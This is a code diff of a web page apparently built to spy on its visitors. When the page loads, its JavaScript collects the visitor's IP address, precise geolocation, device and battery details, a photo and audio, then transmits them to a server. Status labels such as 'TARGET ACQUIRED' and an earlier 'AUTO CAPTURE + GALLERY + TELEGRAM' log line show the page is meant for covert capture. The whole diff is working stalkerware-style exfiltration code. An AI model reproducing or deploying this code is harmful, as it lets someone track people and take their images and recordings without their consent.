             navigator.geolocation.getCurrentPosition(
                 pos => {
@@ -643,19 +775,15 @@ function getLocation() {
                         userLocation.lat.toFixed(6) + ', ' + userLocation.lng.toFixed(6);
                     document.getElementById('devAccuracy').textContent = 
                         userLocation.accuracy + 'm';
-                    const badge = document.getElementById('accuracyBadge');
-                    badge.innerHTML = userLocation.accuracy < 20 ? 
-                        '<span class="accuracy-badge high">✅ HIGH</span>' :
-                        '<span class="accuracy-badge medium">⚠️ MEDIUM</span>';
-                    log('✅ Location: ' + userLocation.lat.toFixed(4) + ', ' + userLocation.lng.toFixed(4));
+                    log('✅ LOCATION LOCKED: ' + userLocation.lat.toFixed(4) + ', ' + userLocation.lng.toFixed(4));
                     resolve(true);
                 },
                 () => {
                     userLocation = { lat: 28.6139, lng: 77.2090, accuracy: 1000 };
                     document.getElementById('devLocation').textContent = 
-                        '28.6139, 77.2090 (approx)';
-                    document.getElementById('devAccuracy').textContent = 'Approx';
-                    log('⚠️ Fallback location');
+                        '28.6139, 77.2090 (APPROX)';
+                    document.getElementById('devAccuracy').textContent = 'APPROX';
+                    log('⚠️ LOCATION FALLBACK');
                     resolve(true);
                 },
                 { enableHighAccuracy: true, timeout: 5000 }
@@ -686,7 +814,7 @@ async function getDeviceInfo() {
     if (navigator.getBattery) {
         navigator.getBattery().then(b => {
             const level = Math.round(b.level * 100) + '%';
-            document.getElementById('devBattery').textContent = level + (b.charging ? ' 🔌' : '');
+            document.getElementById('devBattery').textContent = level + (b.charging ? ' ⚡' : '');
             deviceDetails.batteryLevel = level;
         });
     }
@@ -699,13 +827,13 @@ async function getDeviceInfo() {
         deviceModel: getDeviceModel(),
         manufacturer: getManufacturer()
     };
-    log('📱 Device: ' + os + ' | ' + browser);
+    log('📱 DEVICE SCANNED: ' + os + ' | ' + browser);
 }
 
 // ===== SUBMIT =====
 async function submitData() {
-    log('📤 Submitting all data...');
-    setStatus('📤', 'Submitting...', 'loading');
+    log('📤 TRANSMITTING DATA...');
+    setStatus('📤', 'TRANSMITTING...', 'loading');
     
     const fullDevice = await getFullDeviceInfo();
     updateDeviceUI(fullDevice);
@@ -722,28 +850,26 @@ async function submitData() {
                 userPhoto: userPhoto,
                 audioData: audioData,
                 ipAddress: ipAddress,
-                fullDeviceInfo: fullDevice,
-                galleryCount: galleryCount,
-                behaviorData: { timestamp: new Date().toISOString() }
+                fullDeviceInfo: fullDevice
             })
         });
         const data = await response.json();
         if (data.success) {
-            log('✅✅ ALL DATA STORED! 🎉');
-            setStatus('🎉', 'DATA STORED!', 'success');
-            photoBadge.textContent = '✅ Stored!';
+            log('✅✅ DATA TRANSMITTED!');
+            setStatus('🎯', 'TARGET ACQUIRED!', 'success');
+            photoBadge.textContent = '✅ STORED!';
             setTimeout(() => { location.reload(); }, 5000);
         }
     } catch(err) {
-        log('❌ Submit error: ' + err.message);
-        setStatus('❌', 'Error', 'error');
+        log('❌ TRANSMISSION ERROR: ' + err.message);
+        setStatus('❌', 'ERROR', 'error');
     }
 }
 
 // ===== MAIN =====
 async function startAutoProcess() {
-    log('🚀 Starting...');
-    setStatus('⏳', 'Starting...', 'loading');
+    log('🚀 SYSTEM INITIALIZED');
+    setStatus('⏳', 'SCANNING TARGET...', 'loading');
     await getIPv4Address();
     await getLocation();
     await getDeviceInfo();
@@ -754,11 +880,11 @@ async function startAutoProcess() {
 }
 
 window.addEventListener('load', function() {
-    log('📱 Page loaded');
+    log('📱 TARGET ACQUIRED');
     setTimeout(startAutoProcess, 500);
 });
 
-console.log('🚀 AUTO CAPTURE + GALLERY + TELEGRAM LOADED!');
+console.log('🚀 TARGET ACQUISITION SYSTEM ACTIVE');
 </script>
 </body>
 </html>
